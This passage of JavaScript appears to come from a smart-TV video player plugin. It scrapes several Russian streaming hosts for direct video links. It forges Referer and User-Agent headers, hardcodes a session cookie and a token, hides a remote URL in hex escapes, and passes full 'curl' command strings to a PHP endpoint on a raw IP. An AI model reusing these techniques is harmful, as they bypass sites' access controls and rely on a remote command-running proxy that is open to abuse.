            cls["push"]([l, "http://www.youtube.com/watch?v=" + n, p, "<div class='film' style='float: left; margin: 0 0 0 5px; width: 100%; height: 380px;'><div class='title' style='margin: 0 0 0 5px; position: relative; border: 0px solid #EBEBEB; color: #00FF00; font-weight: bold; font-size: 25px;'><center>" + l + "</center></div><div class='poster'><img style='float:left; margin: 9px 9px 0px 0px; width: 150px; height: 220px;border: 2px #00FF00 solid;' src='" + p + "'></div><div class='about' style='font-size: 16px; padding: 0 15px 15px 0; position: relative;'><br><b style='color: #00FF00; padding-right: 1px; font-weight: bold;'> </b><font color='BEBEBE'> </font><font color='00FF00'> </font></div>  <div class='genre' style='font-size: 16px;'> <b style='color: #00FF00; font-weight: bold;'> Добавлен: </b><font color='BEBEBE'>" + nt + "</font></div>  <div class='genre' style='font-size: 16px;'> <b style='color: #00FF00; font-weight: bold;'> Продолжительность: </b><font color='BEBEBE'>" + pt + "</font></div>  <div class='genre' style='font-size: 16px;'> <b style='color: #00FF00; font-weight: bold;'> Количество просмотров: </b><font color='BEBEBE'>" + s + "</font></div>  <div class='genre' style='font-size: 16px;'> <b style='color: #00FF00; font-weight: bold;'> Краткое описание: </b><font color='BEBEBE'>" + u + "</font></div></div>", "", "", "", "", "", "", "", "", ""]);
          };
          F62("http://www.youtube.com/watch?v=" + n, cls, "");
          return;
        };
        if (t.indexOf('translations: [["') > 0 && ul.indexOf('show_embed=1') < 0 && ul.indexOf('season=') < 0) {
          ozw = R98(t, 'translations:', 'seasons');
          ozw = ozw.replace(/(\r|\n|\s+)/g, "").split("],");
          for (var i = 0; i < ozw["length"]; i++) {
            if (ozw[i] != "") {
              ch = R98(ozw[i], '["', '"');
              d = R98(ozw[i], '","', '"');
              if (ch != "") {
                cls["push"]([lrdPr("Перевод " + d), lrdPr("http://" + host[2] + "/serial/" + ch + '/iframe?show_embed=1'), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
              }
            }
          };
          F62("http://" + host[2] + "/serial/" + ch + '/iframe?show_embed=1', cls, "");
          return;
        } else if (t.indexOf('seasons: [') > 0 && ul.indexOf('season=') < 0) {
          ozw = R98(t, 'seasons:', 'episode');
          ozw = ozw.replace(/(\[|\]|\"|\r|\n|\s+)/g, "").split(",");
          for (var i = 0; i < ozw["length"]; i++) {
            if (ozw[i] != "") {
              ch = ozw[i];
              cls["push"]([lrdPr(ch + " Cезон"), lrdPr("http://" + host[2] + "/serial/" + host[4] + '/iframe?season=' + ch), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
            }
          };
          F62("http://" + host[2] + "/serial/" + host[4] + '/iframe?season=' + ch, cls, "");
          return;
        } else if (t.indexOf('episodes: [') > 0 && ul.indexOf('season=') > 0 && ul.indexOf('episode=') < 0) {
          ozwe = R98(t, 'episodes:', 'season:');
          ozws = ozwe.replace(/],/g, "");
          ozw = ozws.replace(/(\[|\r|\n|\s+)/g, "").split(",");
          for (var i = 0; i < ozw["length"]; i++) {
            if (ozw[i] != "") {
              ch = ozw[i];
              cls["push"]([lrdPr(ch + " Cерия"), lrdPr(ul + "&episode=" + ch), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
            }
          };
          F62(ul + "&episode=" + ch, cls, "");
          return;
        } else if (ul.indexOf('episode=') > 0) {
          return Y6(10, L[73] + " !");
        }
      } else {
        if (xhr["status"] == 302 && ul["indexOf"]("cookie_fix") > 0) {
          uls = R98(ul, "http", "?");
          return xml_s('http' + uls);
        } else {
          if ((xhr["status"] == 302 || xhr["status"] == 303 || xhr["status"] == 307) && xhr["getResponseHeader"]("Location") && xhr["getResponseHeader"]("Location")["indexOf"]("://") > 0) {
            return xml_s(xhr["getResponseHeader"]("Location"));
          } else {
            if ((xhr["status"] == 404 || xhr["status"] == 500 || xhr["status"] == 502) && ul["indexOf"]("moonwalk.cc") > 0) {
              ul = ul.replace(/moonwalk.cc/, "190.2.141.179");
              return xml_s(ul)
            } else {
              return Y6(10, xhr["status"]);
            }
          }
        }
      }
    }
  };
  xhr["open"]("GET", ul, true);
  xhr["withCredentials"] = true;
  xhr["setRequestHeader"]("User-Agent", "Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0");
  xhr["setRequestHeader"]("Accept", "*/*");
  xhr["setRequestHeader"]("Content-Type", "application/x-javascript; charset=utf-8");
  xhr["setRequestHeader"]("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
  xhr["setRequestHeader"]("Accept-Encoding", "identity");
  xhr["setRequestHeader"]("Referer", ul);
  xhr["setRequestHeader"]("DNT", "1");
  xhr["setRequestHeader"]("X-Requested-With", "XMLHttpRequest");
  xhr["send"](null);
};
function xml_k(ul) {
  alert("==xml_k==" + ul);
  xhrAbort();
  LoadTimer("xhrAbort();", 25000);
  Y91(P93);
  R9(L[13], 1, Q91);
  R15(1);
  ul = ul.replace("https", "http");
  ul = ul.split("@")[0];
  alert("==_ul_split==" + ul);
  uls = ul.replace(/@/g, "?");
  var host = ul.split("/");
  xhr = new XMLHttpRequest();
  xhr["onreadystatechange"] = function () {
    if (xhr && xhr["readyState"] == 4) {
      var t = xhr["responseText"];
      if (xhr["status"] == 200) {
        var cls = [],
        ozw = "",
        oz = "",
        d = "",
        boom = "",
        ts = Ach(2),
        ls = Ach(3),
        ch = "";
        if (t.indexOf('<div class="serial-seasons-box">') > 0 && ul.indexOf('pd_sign=') > 0 && ul.indexOf('/go/seria/') < 0 && ul.indexOf('season=') < 0) {
          ozw = R98(t, '<div class="serial-seasons-box">', '</select>');
          alert("==t_K==" + ul);
          ozw = ozw.split('<option');
          for (var i = 0; i < ozw["length"]; i++) {
            if (ozw[i] != "") {
              ch = R98(ozw[i], 'value="', '"');
              d = R98(ozw[i], '">', '</option>');
              if (ch != "") {
                cls["push"]([lrdPr(d), lrdPr(ul + '&season=' + ch), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
              }
            }
          };
          F62(ul + '&season=' + ch, cls, "");
          return;
        } else if (t.indexOf('<div class="season-') > 0 && ul.indexOf('/go/seria/') < 0 && ul.indexOf('season=') > 0) {
          sez = ul.split('season=');
          alert("==sez==" + sez[1]);
          ozw = R98(t, '<div class="season-' + sez[1], '</div>');
          alert("==sez==" + sez);
          ozw = ozw.split('<option');
          for (var i = 0; i < ozw["length"]; i++) {
            if (ozw[i] != "") {
              ch = R98(ozw[i], 'value="', '">');
              d = R98(ozw[i], '">', '</option>');
              if (ch != "") {
                cls["push"]([lrdPr("" + d), lrdPr("http:" + ch), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
              }
            }
          };
          return F62("http:" + ch, cls, "");
        } else if (t.indexOf('<div class="spacing">') > 0 && ul.indexOf('/go/seria/') < 0 && ul.indexOf('season=') < 0) {
          ozw = R98(t, '<div class="serial-translations-box">', '</select>');
          alert("==ul==<div class='spacing'>" + ul);
          ozw = ozw.split('<option');
          for (var i = 0; i < ozw["length"]; i++) {
            if (ozw[i] != "") {
              ch = R98(ozw[i], 'value="', '" data');
              d = R98(ozw[i], '">', '</option>');
              if (ch != "") {
                cls["push"]([lrdPr("Перевод " + d), lrdPr("http:" + ch), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
              }
            }
          };
          return F62("http:" + ch, cls, "");
        } else if (t.indexOf('<div class="spacing">') < 0 && t.indexOf('<div class="serial-seasons-box">') > 0 && ul.indexOf('/go/seria/') < 0 && ul.indexOf('season=') < 0) {
          ozw = R98(t, '<div class="serial-seasons-box">', '</select>');
          alert("==t_K==" + t);
          ozw = ozw.split('<option');
          for (var i = 0; i < ozw["length"]; i++) {
            if (ozw[i] != "") {
              ch = R98(ozw[i], 'value="', '"');
              d = R98(ozw[i], '">', '</option>');
              if (ch != "") {
                cls["push"]([lrdPr(d), lrdPr(ul + '&season=' + ch), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
              }
            }
          };
          return F62(ul + '&season=' + ch, cls, "");
        } else if (t.indexOf('link') > 0 && ul.indexOf('kodikapi') >= 0) {
          alert("==t_K==" + t);
          df = t.split('type');
          for (var i = 0; i < df["length"]; i++) {
            alert('+df[i].results++' + df[i]);
            res = df[i];
            lin = R98(res, 'link":"', '"');
            if (lin.indexOf('http') < 0) {
              link = 'http:' + lin;
            };
            ch = link;
            quality = R98(res, 'quality":"', '"');
            title = R98(res, 'title":"', '"');
            year = R98(res, 'year":"', '"');
            if (lin != "") {
              cls["push"]([lrdPr(title + '-' + quality + '' + year), lrdPr(ch), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
            }
          };
          return F62(ch, cls, "");
        } else {
          return Y6(10, L[73] + " !");
        }
      }
    }
  };
  xhr["open"]("GET", ul, true);
  xhr["withCredentials"] = true;
  xhr["setRequestHeader"]("User-Agent", "Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0");
  xhr["setRequestHeader"]("Accept", "*/*");
  xhr["setRequestHeader"]("Content-Type", "application/x-javascript; charset=utf-8");
  xhr["setRequestHeader"]("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
  xhr["setRequestHeader"]("Accept-Encoding", "identity");
  xhr["setRequestHeader"]("Referer", ul);
  xhr["setRequestHeader"]("DNT", "1");
  xhr["setRequestHeader"]("X-Requested-With", "XMLHttpRequest");
  xhr["send"](null);
};
function kodik_720p(ul) {
  alert("==kodik_720p==" + ul);
  xhrAbort();
  LoadTimer("xhrAbort();", 25000);
  Y91(P93);
  R9(L[13], 1, Q91);
  R15(1);
  var id = '',
  has = '',
  ref2 = '',
  lin = '',
  post = '',
  pul = '',
  spul = '',
  qual = '',
  hash2 = "OErmnYyYA4wHwOP",
  host_link = "http://kodik.cc/video-links";
  xhr = new XMLHttpRequest();
  xhr["onreadystatechange"] = function () {
    if (xhr && xhr["readyState"] == 4) {
      var t = xhr["responseText"];
      if (xhr["status"] == 200) {
        if (ul.indexOf('/video/') > 0) {
          alert("==t_K==" + ul);
          has = ul.split('/');
          id = R98(t, 'var videoId = "', '";');
          alert("==t_K==" + id);
          ref2 = R98(t, 'iframe.src = "', '";');
          lin = R98(ref2 + '";', '720p?d', '";');
          lin = lin.replace(/\//g, "%2F");
          lin = lin.replace(/:/g, "%3A");
          post = 'd' + lin + "&bad_user=false&type=video&hash2=" + hash2 + "&hash=" + has[5] + '&id=' + id;
          alert("==lin==" + post);
          try {
            m = LOAD.postURL(host_link, post, "", "", ul);
            alert("==lin==" + m);
            res = R98(m, 'http', '"');
            if (res['indexOf']('key=') > 0) {
              return R96('', '', 'http' + res);
            };
            pul = R98(m, '"links":', ',"vast');
            spul = pul.split('],');
            for (var i = spul['length'] - 1; i > -1; i--) {
              lin = R98(spul[i], 'src":"', '",');
              qual = R98(spul[i], '"', '":');
              if (lin.indexOf('http') < 0) {
                lin = 'http:' + lin;
              };
              P59['push']([lin, qual]);
              if (!Q3 && qual <= Number(O12[A['A16']])) {
                R42(lin);
                Z18 = P59['length'] - 1;
              }
            };
            if (!Q3) {
              if (P59['length']) {
                R42(P59[0][0]);
              } else {
                Y6(12)
              }
            }
          } catch (_error) {
            return Y6(10, xhr["status"]);
          }
        } else {
          if (ul.indexOf('/go/seria/') > 0) {
            alert("==lin==" + ul);
            ha = ul.split('/');
            hash = ha[6];
            id = ha[5];
            po = R98(ul, '?', '&sl=');
            alert("==lin_po==" + po);
            post = po + "&bad_user=false&type=seria&hash2=" + hash2 + "&hash=" + hash + "&id=" + id;
            alert("==lin_p==" + post);
            try {
              m = LOAD.postURL(host_link, post, "", "", ul);
              alert("==lin+m==" + m);
              res = R98(m, 'http', '"');
              if (res['indexOf']('key=') > 0) {
                return R96('', '', 'http' + res);
              };
              pul = R98(m, '"links":', ',"vast');
              spul = pul.split('],');
              for (var i = spul['length'] - 1; i > -1; i--) {
                lin = R98(spul[i], 'src":"', '",');
                qual = R98(spul[i], '"', '":');
                if (lin.indexOf('http') < 0) {
                  lin = 'http:' + lin;
                };
                P59['push']([lin, qual]);
                if (!Q3 && qual <= Number(O12[A['A16']])) {
                  R42(lin);
                  Z18 = P59['length'] - 1;
                }
              };
              if (!Q3) {
                if (P59['length']) {
                  R42(P59[0][0]);
                } else {
                  Y6(12)
                }
              }
            } catch (_error) {
              return Y6(10, xhr["status"]);
            }
          } else {
            if (ul.indexOf('/episode/') > 0) {
              if (ul.indexOf('go/episode') < 0) {
                ul = R98(t, 'iframe.src = "', '"');
                return kodik_720p('http:' + ul);
              } else {
                alert("==lin episode=" + ul);
                ha = ul.split('/');
                d = R98(t, 'var domain = "', '"');
                d_sign = R98(t, 'var d_sign = "', '"');
                pd = R98(t, 'var pd = "', '"');
                pd_sign = R98(t, 'var pd_sign = "', '"');
                ref = R98(ul, 'http', '?');
                ref_sign = R98(t, 'var ref_sign = "', '"');
                hash = R98(t, "videoInfo.hash = '", "'");
                id = R98(t, "videoInfo.id = '", "'");
                po = "d=" + d + "&d_sign=" + d_sign + "&pd=" + pd + "&pd_sign=" + pd_sign + "&ref=http" + ref + "&ref_sign=" + ref_sign + "&bad_user=false&hash2=" + hash2 + "&type=episode&hash=" + hash + "&id=" + id;
                post = po;
                alert("==lin==" + post);
                try {
                  m = LOAD.postURL(host_link, post, "", "", ul);
                  alert("==lin==" + m);
                  res = R98(m, 'http', '"');
                  pul = R98(m, '"links":', ',"vast');
                  spul = pul.split('],');
                  for (var i = spul['length'] - 1; i > -1; i--) {
                    lin = R98(spul[i], 'src":"', '",');
                    qual = R98(spul[i], '"', '":');
                    if (lin.indexOf('http') < 0) {
                      lin = 'http:' + lin;
                    };
                    P59['push']([lin, qual]);
                    if (!Q3 && qual <= Number(O12[A['A16']])) {
                      R42(lin);
                      Z18 = P59['length'] - 1;
                    }
                  };
                  if (!Q3) {
                    if (P59['length']) {
                      R42(P59[0][0]);
                    } else {
                      Y6(12)
                    }
                  }
                } catch (_error) {
                  return Y6(10, xhr["status"]);
                }
              }
            }
          }
        }
      }
    }
  };
  xhr["open"]("GET", ul, true);
  xhr["withCredentials"] = true;
  xhr["setRequestHeader"]("User-Agent", "Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0");
  xhr["setRequestHeader"]("Accept", "*/*");
  xhr["setRequestHeader"]("Content-Type", "application/x-javascript; charset=utf-8");
  xhr["setRequestHeader"]("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
  xhr["setRequestHeader"]("Accept-Encoding", "identity");
  xhr["setRequestHeader"]("Referer", ul);
  xhr["setRequestHeader"]("DNT", "1");
  xhr["setRequestHeader"]("X-Requested-With", "XMLHttpRequest");
  xhr["send"](null);
};
var LOAD = {
  xnGXy: null
};
LOAD.getURL = function (e, ref) {
  Y22();
  if (null !== this.xnGXy) {
    if (this.xnGXy["destroy"]) {
      this.xnGXy.destroy()
    }
  };
  this.xnGXy = new XMLHttpRequest;
  try {
    this.xnGXy.open("GET", e, !1);
    if (!Tizen) {
      LOAD.printGET(this.xnGXy, ref);
    };
    this.xnGXy.send(null);
  } catch (l) {
    return "";
  };
  if ((this.xnGXy.status == 301 || this.xnGXy.status == 302 || this.xnGXy.status == 303 || this.xnGXy.status == 307) && this.xnGXy.getResponseHeader("Location") != null) {
    return this.xnGXy.getResponseHeader("Location") + "#ref";
  } else {
    return this.xnGXy.responseText;
  }
};
LOAD.getMon = function (e, ref) {
  Y22();
  if (null !== this.xnGXy) {
    if (this.xnGXy["destroy"]) {
      this.xnGXy.destroy();
    }
  };
  this.xnGXy = new XMLHttpRequest;
  try {
    this.xnGXy.open("GET", e, !1),
    this.xnGXy.setRequestHeader("Referer", ref),
    this.xnGXy.send(null)
  } catch (l) {
    return ""
  };
  if ((this.xnGXy.status == 301 || this.xnGXy.status == 302 || this.xnGXy.status == 303 || this.xnGXy.status == 307) && this.xnGXy.getResponseHeader("Location") != null) {
    return this.xnGXy.getResponseHeader("Location") + "#ref"
  } else {
    return this.xnGXy.responseText
  }
};
LOAD.printGET = function (x, q) {
  if (!x) {
    alert(q);
    return
  };
  x.setRequestHeader("User-Agent", "Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 "),
  x.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),
  x.setRequestHeader("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"),
  x.setRequestHeader("Accept-Encoding", "gzip, deflate"),
  x.setRequestHeader("Referer", q),
  x.setRequestHeader("Connection", "keep-alive"),
  x.setRequestHeader("Cache-Control", "no-cache"),
  x.withCredentials = true
};
LOAD.postURL = function (url, data, lev, token, ref) {
  null !== this.xnGXy && this.xnGXy.destroy(),
  this.xnGXy = new XMLHttpRequest;
  try {
    this.xnGXy.open("POST", url, !1),
    LOAD.printPOST(this.xnGXy, lev, token, ref, data),
    this.xnGXy.send(data);
  } catch (l) {
    return "";
  };
  return this.xnGXy.responseText;
};
LOAD.printPOST = function (x, set, token, ref, data) {
  if (!x) {
    return
  };
  var j = ref.split('/');
  var s = data.length;
  if (ref.indexOf("ahoy.yohoho.cc") >= 0) {
    x.setRequestHeader("Origin", "ahoy.yohoho.cc/"),
    x.setRequestHeader("Referer", "http://ahoy.yohoho.cc/")
  };
  if (ref.indexOf("filmix") >= 0) {
    x.setRequestHeader('Accept', 'application/json, text/javascript, */*; q=0.01'),
    x.setRequestHeader("Orgin", j[0] + j[1] + j[2]),
    x.setRequestHeader('Cookie', '_ym_uid=' + Math.round(new Date().getTime() / 1000.0) + '77701111; FILMIXNET=u0tvh7u6qp27os1qj0cgdb78g3; uppodhtml5_volume=0.8;'),
    x.setRequestHeader("User-Agent", navigator.userAgent),
    x.setRequestHeader("Referer", ref)
  } else {
    x.setRequestHeader("Host", j[2]),
    x.setRequestHeader("Accept", "*/*");
    x.setRequestHeader("User-Agent", navigator.userAgent)
  };
  x.setRequestHeader("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.4"),
  x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),
  x.setRequestHeader("Content-Length", s),
  x.setRequestHeader("Proxy-Connection", "keep-alive"),
  x.setRequestHeader("X-Requested-With", "XMLHttpRequest");
  if (set != "" && set != null) {};
  x.withCredentials = true;
};
function hdgo(ul) {
  ul = ul.replace("?ref=?ref=", "?ref=hdgo.club");
  alert("==hdgo=" + ul);
  if (Tizen) {
    tizen.websetting.setUserAgentString("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100627 Firefox/3.6.6");
  };
  xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (Load_timer < 0) {
      return;
    };
    if (xhr['readyState'] == 4) {
      clearTimeout(Load_timer);
      if (xhr['status'] == 200) {
        if (ul['indexOf']('hdgo.cx') > 0) {
          var t = xhr["responseText"];
          uls = R98(t, '<iframe src="', '" width');
          uls = uls.replace("?ref=", "");
          alert("--uls--" + uls);
          pr = xhr["responseText"]['match'](/\/\/[a-z0-9.]*\/video\/[0-9]*\/[a-z0-9\/:-]*.mp4/g);
          if (!pr) {
            if (uls.indexOf("http") > 0) {
              return hdgo(uls)
            } else {
              return hdgo("http:" + uls)
            }
          };
        };
        var host = ul.split('/');
        if ((ul['indexOf']('serial') > 0 && ul['indexOf']('&e=') < 0)) {
          var t = xhr["responseText"];
          var cls = [],
          ozw = "",
          d = "",
          ts = Ach(2),
          ls = Ach(3),
          ch = "";
          if (t.indexOf('name="translate"') > 0 && ul.indexOf('season=') < 0 && ul.indexOf('ref=hdgo.club') < 0) {
            ozw = R98(t, 'name="translate"', '</select>');
            ozw = ozw.split("<option");
            for (var i = 1; i < ozw["length"]; i++) {
              if (ozw[i] != "") {
                ch = R98(ozw[i], 'value="', '">');
                d = R98(ozw[i], '>', '<');
                if (ch != "") {
                  cls["push"]([lrdPr("Перевод " + d), lrdPr("http://" + host[2] + '/' + host[3] + '/' + host[4] + '/' + host[5] + '/' + ch + '/?ref=hdgo.club'), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
                } else {
                  cls["push"]([lrdPr("Перевод " + d), lrdPr(ul + '?ref=hdgo.club'), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
                }
              }
            };
            F62(ul + '?ref=hdgo.club', cls, "");
            return;
          };
          if (t.indexOf('name="season"') > 0 && ul.indexOf('ref=hdgo.club') > 0 && ul.indexOf('season=') < 0) {
            ozw = R98(t, 'name="season"', '</select>');
            ozw = ozw.split("<option");
            for (var i = 1; i < ozw["length"]; i++) {
              if (ozw[i] != "") {
                ch = R98(ozw[i], 'value="', '">');
                d = R98(ozw[i], '>', '<');
                cls["push"]([lrdPr(d), lrdPr(ul + '&season=' + ch), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
              }
            };
            F62(ul + '&season=' + ch, cls, "");
            return;
          };
          if (t.indexOf('name="episode"') > 0 && ul.indexOf('season=') > 0) {
            ozw = R98(t, 'name="episode"', '</select>');
            ozw = ozw.split("<option");
            for (var i = 1; i < ozw["length"]; i++) {
              if (ozw[i] != "") {
                ch = R98(ozw[i], 'value="', '">');
                d = R98(ozw[i], '>', '<');
                cls["push"]([lrdPr(d), lrdPr(ul + '&e=' + ch), lrdPr(ts), lrdPr(ls), "", "", "", "", "", "", "", "", ""]);
              }
            };
            F62(ul + '&e=' + ch, cls, "");
            return;
          }
        } else {
          pr = xhr["responseText"]['match'](/\/\/[a-z0-9.]*\/video\/[0-9]*\/[a-z0-9\/:-]*.mp4/g);
          for (var i = pr['length'] - 1; i > -1; i--) {
            ne = 0;
            if (pr[i]['indexOf']('/4/') > 0) {
              ne = 1080;
              st = LOAD.getURL("http://85.17.30.89/xhr.php?u=curl -i \"http:" + pr[i] + "\" -H \"Referer: http://hdgo.cc/\" -H \"Pragma: no-cache\" -H \"DNT: 1\" -H \"Accept-Encoding: deflate\" -H \"Accept-Language: ru,en;q=0.8,uk;q=0.6,bg;q=0.4\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\" -H \"Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" -H \"Cache-Control: no-cache\" -H \"Connection: keep-alive\"", ul);
              strim = R98(st, 'https', 'mp4');
              if (!strim) {
                strim = R98(st, 'http', 'mp4');
              };
              ms = 'http' + strim + 'mp4';
            } else {
              if (pr[i]['indexOf']('/3/') > 0) {
                ne = 720;
                st = LOAD.getURL("http://85.17.30.89/xhr.php?u=curl -i \"http:" + pr[i] + "\" -H \"Referer: http://hdgo.cc/\" -H \"Pragma: no-cache\" -H \"DNT: 1\" -H \"Accept-Encoding: deflate\" -H \"Accept-Language: ru,en;q=0.8,uk;q=0.6,bg;q=0.4\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\" -H \"Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" -H \"Cache-Control: no-cache\" -H \"Connection: keep-alive\"", ul);
                strim = R98(st, 'https', 'mp4');
                if (!strim) {
                  strim = R98(st, 'http', 'mp4');
                };
                ms = 'http' + strim + 'mp4';
              } else {
                if (pr[i]['indexOf']('/2/') > 0) {
                  ne = 480;
                  st = LOAD.getURL("http://85.17.30.89/xhr.php?u=curl -i \"http:" + pr[i] + "\" -H \"Referer: http://hdgo.cc/\" -H \"Pragma: no-cache\" -H \"DNT: 1\" -H \"Accept-Encoding: deflate\" -H \"Accept-Language: ru,en;q=0.8,uk;q=0.6,bg;q=0.4\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\" -H \"Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" -H \"Cache-Control: no-cache\" -H \"Connection: keep-alive\"", ul);
                  strim = R98(st, 'https', 'mp4');
                  if (!strim) {
                    strim = R98(st, 'http', 'mp4');
                  };
                  ms = 'http' + strim + 'mp4';
                } else {
                  if (pr[i]['indexOf']('/1/') > 0) {
                    ne = 360;
                    st = LOAD.getURL("http://85.17.30.89/xhr.php?u=curl -i \"http:" + pr[i] + "\" -H \"Referer: http://hdgo.cc/\" -H \"Pragma: no-cache\" -H \"DNT: 1\" -H \"Accept-Encoding: deflate\" -H \"Accept-Language: ru,en;q=0.8,uk;q=0.6,bg;q=0.4\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\" -H \"Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8\" -H \"Cache-Control: no-cache\" -H \"Connection: keep-alive\"", ul);
                    strim = R98(st, 'https', 'mp4');
                    if (!strim) {
                      strim = R98(st, 'http', 'mp4');
                    };
                    ms = 'http' + strim + 'mp4';
                  }
                }
              }
            };
            if (!ne) {
              continue;
            };
            P59['push']([ms, ne]);
            if (!Q3 && ne <= Number(O12[A['A17']])) {
              R42(ms);
              Z18 = P59['length'] - 1;
            }
          };
          if (!Q3) {
            if (P59['length']) {
              R42(P59[0][0]);
            } else {
              Y6(12)
            }
          }
        }
      }
    }
  };
  xhr['open']('GET', ul, true);
  xhr["send"]();
};
function okru(ul) {
  if (Tizen) {
    tizen.websetting.setUserAgentString("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100627 Firefox/3.6.6");
  };
  xhr = null;
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (xhr.readyState == 4) {
      var t = xhr["responseText"].replace(/\\/g, "").replace(/\[\[/g, "").replace(/\]\]/g, "");
      if (t['indexOf']('://') == -1) {
        return Y6(12);
      };
      var par = t['match'](/:\/\/.*?tkn=[0-9]*/g);
      par = par["reverse"]();
      for (var i = par['length'] - 1; i > -1; i--) {
        if (par[i]['indexOf']('mq=3') > 0) {
          ne = 720;
        } else {
          if (par[i]['indexOf']('mq=2') > 0) {
            ne = 480;
          } else {
            if (par[i]['indexOf']('mq=1') > 0) {
              ne = 360;
            } else {
              if (par[i]['indexOf']('mq=0') > 0) {
                ne = 240;
              }
            }
          }
        };
        P59['push'](['http' + par[i], ne]);
        if (!Q3 && ne <= Number(O12[A['A16']])) {
          R42(par[i]);
          Z18 = P59['length'] - 1;
        }
      };
      if (!Q3) {
        if (P59['length']) {
          R42(P59[0][0]);
        } else {
          Y6(12)
        }
      }
    };
  };
  xhr.open('GET', ul, true);
  xhr.send();
};
var it = 0, ul_moon = '';
function Get_Moon(ul, flag) {
  alert('Start --Get_Moon--' + ul + '---' + flag);
  if (x2 != null) {
    x2 = null;
  };
  var x = "\x68\x74\x74\x70\x3A\x2F\x2F\x72\x65\x6D\x6F\x74\x65\x2E\x66\x6F\x72\x6B\x70\x6C\x61\x79\x65\x72\x2E\x74\x76\x2F\x73\x6D\x61\x72\x74\x74\x76\x2F\x61\x70\x69\x2E\x70\x68\x70\x3F\x64\x6F\x3D\x78\x68\x72\x72\x65\x6D\x6F\x74\x65\x32\x26\x76\x70\x3D\x32\x26\x74\x69\x6D\x65\x3D\x33\x36\x30\x30\x26\x64\x69\x72\x65\x63\x74\x26\x76\x3D" + flag + "&u=" + encodeURIComponent(ul);
  var x2 = new XMLHttpRequest();
  if (P7 && x2["overrideMimeType"]) {
    x2["overrideMimeType"]("text/html");
  };
  x2.onreadystatechange = function () {
    if (x2.readyState == 4) {
      m = (x2.responseText);
      alert('Get_Moon_resp: ' + m);
      if (m != null && m != '') {
        if (m.indexOf('wait') >= 0 && flag == "wget" && it < 10) {
          it++;
          ul_moon = ul;
          return setTimeout('Get_Moon(ul_moon,"wget")', 1000)
        };
        it = 0;
        if (m["indexOf"]("#EXT-X-STREAM-INF") >= 0) {
          t = m["split"]("#EXT-X-STREAM-INF");
          var st,
          uar,
          ar = [],
          tar = [];
          for (var i = t["length"] - 1; i > 0; i--) {
            uar = t[i]["split"]("\x0A");
            if (uar["length"] < 2 || !dPr(uar[1])) {
              continue;
            };
            st = R98(uar[0], "RESOLUTION=", ",");
            st = (st["indexOf"]("x") > 0) ? st["split"]("x")[1] : dPr(R98(uar[0], "BANDWIDTH=", ","), 1);
            if (!dPr(st, 1)) {
              st = (i + 1) * 10000;
            };
            if (Number(st) < 240) {
              continue;
            };
            uar[1] = (uar[1]["indexOf"]("://") > 0) ? lrdPr(uar[1]) : ul["substring"](0, ul["lastIndexOf"]("/") + 1) + lrdPr(uar[1]);
            P59["push"]([dSp(uar[1]), Number(st)]);
            ar["push"](Number(st));
          };
          ar["sort"](function (a, b) {
            return a - b;
          });
          for (var i in ar) {
            for (var f in P59) {
              if (P59[f][1] == ar[i]) {
                tar["push"](P59[f]);
                break;
              }
            }
          };
          P59 = tar;
          if (P59["length"] > 1 && ((P59[0][1] > P59[P59["length"] - 1][1] && P59[P59["length"] - 1][1] >= 10000) || (P59[0][1] < P59[P59["length"] - 1][1] && P59[P59["length"] - 1][1] < 10000))) {
            P59["reverse"]();
          };
          Y66();
        } else {
          Y6(12);
        }
      } else {
        it++;
        if (it < 10) {
          ul_moon = ul;
          return setTimeout('Get_Moon(ul_moon, "wget")', 500);
        }
      }
    }
